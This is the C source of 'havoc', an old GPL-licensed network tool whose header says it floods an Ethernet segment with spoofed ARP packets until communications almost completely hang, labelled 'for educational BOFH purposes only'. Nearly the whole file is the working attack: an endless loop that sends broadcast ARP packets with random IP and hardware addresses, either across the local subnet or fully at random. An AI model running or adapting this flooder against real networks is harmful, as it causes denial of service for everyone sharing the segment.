/*
 *  $Id$
 *  havoc-
 * 
 *  This program generates a large amount of traffic in your ethernet
 *  segment, (almost) completely hanging up communications. It uses
 *  spoofed arp packets. For educational BOFH purposes only :)
 *
 *  by Raptor - y2k
 *
 *  Based on send_arp.c, by yuri volobuev'97
 *
 *  Copyright (c) 2000 raptor <raptor@antifork.org>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 *
 */


#include "symbols.h"
#include "config.h"
#include "std.h"
#include "if.h"
#include "proto.h"
#include "version.h"


void fatalerr(char *pattern,...)
{
        va_list ap;
        va_start(ap, pattern);

        fprintf(stderr,"havoc-");
        vfprintf(stderr,pattern,ap);
        fprintf(stderr," (exit forced).\n");

        va_end(ap);

        exit(-1);
}


int opt_line, pk_counter;
char DANCER[]="Oo.o";


void ctrlc(int ignored)
{
	fprintf(stderr,"%dK packets sent, done.\n",pk_counter/1000);
        exit(1);
}


int main(int argc,char** argv)
{
	struct sockaddr_in addr, netm;
	char if_name[16]="\0";

#if HAVE_GETOPT_LONG
        static struct option long_options[] =
        {
		{"if", required_argument, NULL, 'i'},
                {"random" , no_argument, NULL, 'r'},
                {"help", no_argument, NULL, 'h'},
                {"version", no_argument, NULL, 'v'},
                {0, 0, 0, 0}
        };

#endif
        if (argc<2) usage(argv[0]);

        /* default verbose option */

        {
        int c=0;

#if HAVE_GETOPT_LONG
        while ((c=getopt_long(argc,argv,"i:rhv",long_options,(int *)0)) != EOF)
#else
        while ((c=getopt(argc,argv,"i:rhv")) != EOF)
#endif

                switch (c) {
                case 'h':
                        usage(argv[0]);
                        break;
                case 'v':
                        fprintf(stderr,"HAVOC %s on %s: arp traffic generator\nCopyright (c) 2000 %s %s\n\n",VERSION,CPU_MFR_OPSYS,AUTHOR,MAIL_SUPPORT);
                        exit(1);
                        break;
		case 'i':
			opt_line |= OPT_IF;
			strncpy(if_name,optarg,15);
			break;
		case 'r':
			opt_line |= OPT_RAND;
			break;			
                }
        }

        signal(SIGINT,ctrlc);

	if (!(opt_line & OPT_IF) || !*if_name)
			fatalerr ("err: -i/--if <arg> required");
			
        if (get_if(&addr,&netm,if_name))
                        fatalerr ("err sendto: No such device");

        fprintf(stderr,"HAVOC %s on %s: arp traffic generator\n",
		VERSION,CPU_MFR_OPSYS);
        fprintf(stdout,"[CTRL+C to stop process]\n");
        fprintf(stdout,"target: %s\n",if_name);

	if (opt_line&OPT_RAND)
		while(1) {
			if (!(pk_counter % 1499))
			  	fprintf(stderr,"%c\r",DANCER[pk_counter%4]);	
		/* totally random ip address (not wise) */
			send_arp(rand_ip(),rand_hw(),rand_ip(),
				"ffffffffffff",if_name);
			pk_counter++;
		}

	while(1) { 
        	if (!(pk_counter % 1499))
                	fprintf(stderr,"%c\r",DANCER[pk_counter%4]);
	/* random ip address in localnet */
	send_arp(rand_ip_net(addr.sin_addr.s_addr,netm.sin_addr.s_addr),
		rand_hw(),rand_ip_net(addr.sin_addr.s_addr,
		netm.sin_addr.s_addr),"ffffffffffff",if_name);
	pk_counter++;
	}
}
